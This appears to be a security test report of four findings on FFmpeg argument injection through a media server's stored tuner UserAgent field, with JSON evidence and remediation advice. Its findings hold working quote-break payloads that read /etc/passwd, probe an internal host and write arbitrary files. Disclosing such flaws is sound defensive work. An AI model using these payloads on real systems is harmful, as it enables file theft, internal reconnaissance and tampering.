tests.description: Tuner UA injection: Quote break + null output + extra input
Tuner UA injection: Read /etc/passwd via -i flag
Tuner UA injection: SSRF to Docker host
Tuner UA injection: Write arbitrary file

findings.title: FFmpeg argument injection stored in tuner config: Inject-quote_break
findings.details: TunerHostInfo.UserAgent accepts and stores arbitrary values including FFmpeg command arguments without sanitization. Stored value: Mozilla" -f null /dev/null -i ". This value flows through M3UTunerHost.cs -> RequiredHttpHeaders -> EncodingHelper.GetUserAgentParam() -> FFmpeg command line via direct string concatenation with no escaping.
findings.evidence:
{
  "Id": "140af78093084875816e610d5e7712c0",
  "Url": "http://[REDACTED-INTERNAL-IP]:9999/test_iptv.m3u",
  "Type": "M3U",
  "FriendlyName": "Inject-quote_break",
  "ImportFavoritesOnly": false,
  "AllowHWTranscoding": true,
  "AllowFmp4TranscodingContainer": false,
  "AllowStreamSharing": true,
  "FallbackMaxStreamingBitrate": 30000000,
  "EnableStreamLooping": false,
  "TunerCount": 0,
  "UserAgent": "Mozilla\" -f null /dev/null -i \"",
  "IgnoreDts": true,
  "ReadAtNativeFramerate": false
}
findings.remediation: Sanitize UserAgent in TunerHostInfo.UserAgent setter or in M3UTunerHost before assigning to RequiredHttpHeaders. Strip double quotes and validate against FFmpeg arg patterns.

findings.title: FFmpeg argument injection stored in tuner config: Inject-file_read_passwd
findings.details: TunerHostInfo.UserAgent accepts and stores arbitrary values including FFmpeg command arguments without sanitization. Stored value: Mozilla" -i /etc/passwd -f rawvideo -pix_fmt rgb24 /tmp/proof.raw -y -i ". This value flows through M3UTunerHost.cs -> RequiredHttpHeaders -> EncodingHelper.GetUserAgentParam() -> FFmpeg command line via direct string concatenation with no escaping.
findings.evidence:
{
  "Id": "951821bcfd704dc2a83d868480176584",

  "AllowStreamSharing": true,

  "TunerCount": 0,
  "UserAgent": "Mozilla\" -i /etc/passwd -f rawvideo -pix_fmt rgb24 /tmp/proof.raw -y -i \"",
  "IgnoreDts": true,
  "ReadAtNativeFramerate": false
}
findings.remediation: Sanitize UserAgent in TunerHostInfo.UserAgent setter or in M3UTunerHost before assigning to RequiredHttpHeaders. Strip double quotes and validate against FFmpeg arg patterns.

findings.title: FFmpeg argument injection stored in tuner config: Inject-ssrf

Stored value: Mozilla" -i http://[REDACTED-INTERNAL-IP]:8096/System/Info -f null /dev/null -y -i ". This value flows through M3UTunerHost.cs -> RequiredHttpHeaders -> EncodingHelper.GetUserAgentParam() -> FFmpeg command line via direct string concatenation with no escaping.

findings.title: FFmpeg argument injection stored in tuner config: Inject-file_write
findings.details: TunerHostInfo.UserAgent accepts and stores arbitrary values including FFmpeg command arguments without sanitization. Stored value: Mozilla" -y -f mp4 /tmp/pwned.mp4 -i ". This value flows through M3UTunerHost.cs -> RequiredHttpHeaders -> EncodingHelper.GetUserAgentParam() -> FFmpeg command line via direct string concatenation with no escaping.
